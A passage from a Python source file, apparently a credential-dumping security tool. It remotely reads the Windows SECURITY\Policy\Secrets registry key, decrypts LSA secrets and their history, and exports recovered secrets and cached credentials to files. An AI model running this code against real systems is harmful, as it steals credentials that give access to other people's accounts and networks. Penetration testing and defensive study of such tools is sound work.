                    typename = NTDSHashes.KERBEROS_TYPE[etype]
                    secret = "%s:%s:%s" % (machinename, typename, hexlify(key.contents).decode('utf-8'))
                    self.__secretItems.append(secret)
                    self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_KERBEROS, secret)
                return True
        else:
            return False

    def dumpSecrets(self):
        LOG.info('Dumping LSA Secrets')

        keys = self.__remoteOps.enumSubKey(r'SECURITY\Policy\Secrets', throttle=self.__throttle)

        if keys is None:
            # No entries
            return
        try:
            # This key has no use for LSASecrets and is only used for MSCache decryption
            keys.remove('NL$KM')
        except:
            pass

        try:
            # Remove unnecessary value
            keys.remove('NL$Control')
        except:
            pass

        if self.__LSAKey == b'':
            self.__getLSASecretKey()

        for key in keys:
            LOG.debug(f'Looking into {key}')
            valueTypeList = ['CurrVal']
            # Check if old LSA secrets values are also need to be shown
            if self.__history:
                valueTypeList.append('OldVal')

            for valueType in valueTypeList:
                try:
                    value = self.__remoteOps.retrieveSubKey(f'SECURITY\\Policy\\Secrets\\{key}\\{valueType}', '', throttle=self.__throttle)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    print(str(e))
                    continue
                if value is not None and value[1] != 0:
                    if self.__vistaStyle is True:
                        record = LSA_SECRET(value[1])
                        tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                        plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
                        record = LSA_SECRET_BLOB(plainText)
                        secret = record['Secret']
                    else:
                        secret = self.__decryptSecret(self.__LSAKey, value[1])

                    # If this is an OldVal secret, let's append '_history' to be able to distinguish it and
                    # also be consistent with NTDS history
                    if valueType == 'OldVal':
                        key += '_history'
                    self.__printSecret(key, secret)

    def getSecret(self, key):
        LOG.info(f'Dumping LSA secret: {key}')

        if self.__LSAKey == b'':
            self.__getLSASecretKey()

        valueTypeList = ['CurrVal']
        # Check if old LSA secrets values are also need to be shown
        if self.__history:
            valueTypeList.append('OldVal')

        for valueType in valueTypeList:
            try:
                value = self.__remoteOps.retrieveSubKey(f'SECURITY\\Policy\\Secrets\\{key}\\{valueType}', '', throttle=self.__throttle)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                print(str(e))
                continue
            if value is not None and value[1] != 0:
                if self.__vistaStyle is True:
                    record = LSA_SECRET(value[1])
                    tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                    plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
                    record = LSA_SECRET_BLOB(plainText)
                    secret = record['Secret']
                else:
                    secret = self.__decryptSecret(self.__LSAKey, value[1])

                # If this is an OldVal secret, let's append '_history' to be able to distinguish it and
                # also be consistent with NTDS history
                if valueType == 'OldVal':
                    key += '_history'
                return secret

    def exportSecrets(self, baseFileName, openFileFunc = None):
        if len(self.__secretItems) > 0:
            fileName = baseFileName + '.secrets'
            fd = openFile(fileName, openFileFunc=openFileFunc)
            for item in self.__secretItems:
                fd.write(item + '\n')
            fd.close()
            return fileName

    def exportCached(self, baseFileName, openFileFunc = None):
        if len(self.__cachedItems) > 0:
            fileName = baseFileName + '.cached'
            fd = openFile(fileName, openFileFunc=openFileFunc)
            for item in self.__cachedItems:
                fd.write(item + '\n')
            fd.close()
            return fileName
